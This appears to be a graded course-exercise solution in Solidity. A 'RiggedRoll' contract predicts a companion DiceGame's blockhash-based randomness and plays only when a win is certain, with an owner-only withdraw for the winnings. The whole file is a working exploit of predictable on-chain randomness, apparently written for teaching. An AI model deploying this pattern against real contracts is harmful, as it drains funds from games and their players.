pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event RigAttempt(address indexed rigger);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) onlyOwner public {
      (bool sent,) = _addr.call{value: _amount}("");
      require(sent, "UNABLE TO TRANSFER BALANCE");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
      require(address(this).balance >= 0.002 ether, "NOT ENOUGH FUNDS TO ROLL THE DICE");
      console.log("**** in riggedRoll, block number:", block.number);
      console.log("**** in riggedRoll, dice nonce:", diceGame.nonce());

      bytes32 prevHash = blockhash(block.number - 1);
      bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
      uint256 roll = uint256(hash) % 16;
      
      if (roll <= 2) {
	diceGame.rollTheDice{value: 0.002 ether}();
      } else {
	revert("NOT A WINNING ATTEMPT");
      }

      emit RigAttempt(msg.sender);
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
